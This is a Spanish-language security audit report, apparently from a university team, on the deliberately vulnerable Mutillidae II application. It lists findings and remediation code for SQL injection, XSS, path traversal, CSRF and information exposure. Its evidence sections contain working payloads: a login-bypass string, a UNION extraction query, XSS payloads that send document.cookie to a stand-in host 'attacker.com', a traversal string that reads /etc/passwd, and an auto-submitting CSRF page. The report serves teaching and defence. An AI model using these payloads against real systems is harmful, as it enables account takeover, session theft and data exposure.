# Resumen de Vulnerabilidades Web Detectadas
## OWASP ZAP - Security Audit Report

**Fecha:** 03 de noviembre de 2024  
**Aplicación:** OWASP Mutillidae II v2.6.36  
**URL Base:** http://localhost/mutillidae/  
**Auditor:** Security Team INSEGUS

---

## Resumen Ejecutivo

Total de vulnerabilidades encontradas: **19**

| Severidad | Cantidad | Porcentaje |
|-----------|----------|------------|
| Crítica | 5 | 26% |
| Alta | 7 | 37% |
| Media | 7 | 37% |

---

## 1. SQL Injection (Crítica)

**Cantidad:** 3 vulnerabilidades  
**OWASP Top 10:** A03:2021 - Injection  
**CWE:** CWE-89

### 1.1 Authentication Bypass

**Ubicación:** `/index.php?page=login.php`  
**Parámetros afectados:** `username`, `password`

**Payload exitoso:**
```sql
' OR '1'='1
```

**Evidencia:**
```http
POST /mutillidae/index.php?page=login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=' OR '1'='1&login-php-submit-button=Login
```

**Respuesta:**
```http
HTTP/1.1 302 Found
Location: index.php?page=home.php&uid=1
Set-Cookie: PHPSESSID=abc123...
```

**Impacto:**
- Bypass completo de autenticación
- Acceso a cuentas sin credenciales
- Escalada de privilegios

**Remediación:**
```php
// Usar prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, password_hash($password, PASSWORD_DEFAULT)]);
```

---

### 1.2 Data Extraction via UNION

**Ubicación:** `/index.php?page=user-info.php`  
**Parámetro afectado:** `username`

**Payload exitoso:**
```sql
admin' UNION SELECT null,username,password,null,null FROM accounts--
```

**Impacto:**
- Extracción de hashes de contraseñas
- Exposición de PII (Información Personal Identificable)
- Posible acceso a otras tablas de la BD

**Datos extraídos:**
```
admin:5f4dcc3b5aa765d61d8327deb882cf99 (password: password)
john:098f6bcd4621d373cade4e832627b4f6 (password: test)
```

---

### 1.3 Blind SQL Injection

**Ubicación:** `/index.php?page=user-poll.php`  
**Parámetro afectado:** `choice`

**Payload exitoso:**
```sql
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

**Impacto:**
- Time-based extraction de datos
- Enumeración de estructura de BD
- Posible denegación de servicio

---

## 2. Cross-Site Scripting (Alta)

### 2.1 XSS Reflejado (5 instancias)

**OWASP Top 10:** A03:2021 - Injection  
**CWE:** CWE-79

#### Instancia 1: DNS Lookup

**Ubicación:** `/index.php?page=dns-lookup.php`  
**Parámetro:** `target_host`

**Payload:**
```html
<script>alert('XSS')</script>
```

**URL vulnerable:**
```
http://localhost/mutillidae/index.php?page=dns-lookup.php&target_host=<script>alert('XSS')</script>
```

**Respuesta HTML:**
```html
<b>Results for <script>alert('XSS')</script></b>
```

**Impacto:**
- Ejecución de JavaScript arbitrario
- Session hijacking vía cookie stealing
- Phishing attacks
- Keylogging

**Payload avanzado (robo de cookies):**
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

---

#### Instancia 2-5: Formularios sin validación

Otros endpoints vulnerables a XSS reflejado:
- `/index.php?page=user-info.php` (parámetro: username)
- `/index.php?page=browser-info.php` (parámetro: User-Agent header)
- `/index.php?page=capture-data.php` (parámetro: data)
- `/index.php?page=html5-storage.php` (parámetro: message)

---

### 2.2 XSS Almacenado (2 instancias)

#### Instancia 1: Blog Comments

**Ubicación:** `/index.php?page=add-to-your-blog.php`  
**Campo:** `blog_entry`

**Payload:**
```html
<img src=x onerror="
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
">
```

**Impacto:**
- Afecta a TODOS los usuarios que visitan la página
- Persistente hasta limpieza de BD
- Worm potential (auto-propagación)
- Defacement del sitio

---

#### Instancia 2: User Registration

**Ubicación:** `/index.php?page=register.php`  
**Campo:** `signature`

**Payload:**
```html
<svg/onload=alert('Stored XSS')>
```

---

## 3. Path Traversal (Crítica)

**Cantidad:** 2 vulnerabilidades  
**OWASP Top 10:** A01:2021 - Broken Access Control  
**CWE:** CWE-22

### 3.1 File Inclusion via 'page' parameter

**Ubicación:** `/index.php`  
**Parámetro:** `page`

**Payload exitoso:**
```
../../../../etc/passwd
```

**URL completa:**
```
http://localhost/mutillidae/index.php?page=../../../../etc/passwd
```

**Contenido expuesto:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:111:117:MySQL Server,,,:/var/lib/mysql:/bin/false
```

**Archivos sensibles accesibles:**
- `/etc/passwd` - Lista de usuarios del sistema
- `/etc/shadow` - Hashes de contraseñas (si permisos incorrectos)
- `/var/www/html/mutillidae/includes/database-config.php` - Credenciales de BD
- `../../config.php` - Configuración de la aplicación

**Impacto:**
- Exposición de credenciales
- Lectura de código fuente
- Información del sistema
- Potencial ejecución remota de código

**Remediación:**
```php
// Whitelist de páginas permitidas
$allowed_pages = ['home', 'login', 'register', 'blog'];
$page = basename($_GET['page']); // Elimina path traversal
$page = str_replace(['..', '/', '\\'], '', $page); // Sanitización adicional

if (!in_array($page, $allowed_pages)) {
    $page = 'home';
}

include("pages/{$page}.php");
```

---

### 3.2 Log File Exposure

**Ubicación:** `/index.php?page=show-log.php`  
**Parámetro:** `log_file`

**Payload:**
```
../../../var/log/apache2/access.log
```

**Impacto:**
- Información sobre estructura del servidor
- IPs de administradores
- Patrón de acceso a la aplicación

---

## 4. Cross-Site Request Forgery (Media)

**Cantidad:** 4 vulnerabilidades  
**OWASP Top 10:** A01:2021 - Broken Access Control  
**CWE:** CWE-352

### 4.1 Blog Entry Creation

**Ubicación:** `/index.php?page=add-to-your-blog.php`  
**Método:** POST

**Exploit HTML:**
```html
<!DOCTYPE html>
<html>
<head><title>Innocent Page</title></head>
<body onload="document.csrf_form.submit()">
    <h1>Loading...</h1>
    <form name="csrf_form" method="POST" 
          action="http://localhost/mutillidae/index.php?page=add-to-your-blog.php" 
          style="display:none;">
        <input type="hidden" name="blog_entry" value="HACKED VIA CSRF">
        <input type="hidden" name="add-to-your-blog-php-submit-button" value="Save Blog Entry">
    </form>
</body>
</html>
```

**Impacto:**
- Acciones no autorizadas en nombre del usuario
- Modificación de datos
- Combinable con XSS para mayor impacto

---

### 4.2-4.4 Otros endpoints vulnerables:

- User Profile Update (`/index.php?page=edit-account-profile.php`)
- Password Change (`/index.php?page=change-password.php`)
- User Registration (`/index.php?page=register.php`)

**Remediación general:**
```php
// Generar token
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// En formulario
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// Validar
if (!isset($_POST['csrf_token']) || 
    !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token validation failed');
}
```

---

## 5. Información Sensible Expuesta (Media)

**Cantidad:** 3 vulnerabilidades  
**OWASP Top 10:** A05:2021 - Security Misconfiguration

### 5.1 PHP Error Disclosure

**Ubicación:** Múltiples páginas

**Información expuesta:**
```
Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /var/www/html/mutillidae/classes/MySQLHandler.php on line 45

Call Stack:
    0.0001     234528   1. {main}() /var/www/html/mutillidae/index.php:0
    0.0123     445672   2. include() /var/www/html/mutillidae/index.php:67
```

**Impacto:**
- Revelación de rutas del servidor
- Información de estructura de código
- Versiones de software

**Remediación:**
```php
// En php.ini o .htaccess
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
```

---

### 5.2 Database Connection String in Comments

**Ubicación:** Código fuente HTML

**Información expuesta:**
```html
<!-- Database: localhost:3306, User: root, Password: XXXXXX -->
```

**Remediación:**
- Eliminar comentarios del código en producción
- Usar variables de entorno para credenciales

---

### 5.3 Directory Listing Enabled

**Ubicación:** `/uploads/`, `/includes/`

**Remediación:**
```apache
# En .htaccess
Options -Indexes
```

---

## Plan de Remediación Priorizado

### INMEDIATO (Día 1-7)

1. **SQL Injection**
   - Implementar prepared statements en TODAS las consultas
   - Auditoría de código para identificar todos los puntos de entrada
   - Principio de mínimo privilegio para usuario de BD

2. **Path Traversal**
   - Whitelist estricto de archivos permitidos
   - Sanitización con `basename()` y eliminación de `../`
   - Validación del lado del servidor

3. **Deshabilitar errores PHP**
   - `display_errors = Off`
   - Logging centralizado

### CORTO PLAZO (Semana 2-4)

4. **XSS (Reflejado y Almacenado)**
   - `htmlspecialchars()` en TODAS las salidas
   - Content Security Policy (CSP)
   - HTTPOnly cookies

5. **CSRF**
   - Tokens CSRF en todos los formularios POST
   - SameSite cookie attribute
   - Verificación de Origin/Referer headers

6. **Información Sensible**
   - Eliminar comentarios de código
   - Deshabilitar directory listing
   - Ocultar versiones de servidor

### MEDIO PLAZO (Mes 2-3)

7. **Seguridad General**
   - Implementar WAF (ModSecurity)
   - Logging y monitoring centralizado
   - Penetration testing periódico
   - Programa de bug bounty

---

## Herramientas Utilizadas

- **OWASP ZAP 2.14.0** - Escáner principal
- **Firefox ESR** - Navegador de pruebas
- **jbrofuzz** - Diccionarios de payloads
- **Burp Suite Community** - Análisis manual complementario

---

## Referencias

- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CWE Top 25: https://cwe.mitre.org/top25/
- NIST SP 800-95: Guide to Secure Web Services

---

**Fin del Reporte**  
**Clasificación:** CONFIDENCIAL  
**Security Team INSEGUS - Universidad de Sevilla**
